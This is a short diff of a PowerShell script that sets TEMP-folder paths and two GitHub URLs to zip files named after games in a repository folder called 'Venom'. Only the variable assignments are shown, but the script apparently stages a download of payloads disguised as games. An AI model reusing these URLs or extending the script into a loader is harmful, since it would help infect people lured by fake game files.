@@ -1,4 +1,4 @@
-$textPath = "$env:TEMP\perm.txt"
+$textPath = "$env:TEMP"
 $zipFilePath = "$env:TEMP"
 $zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
 $zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip"
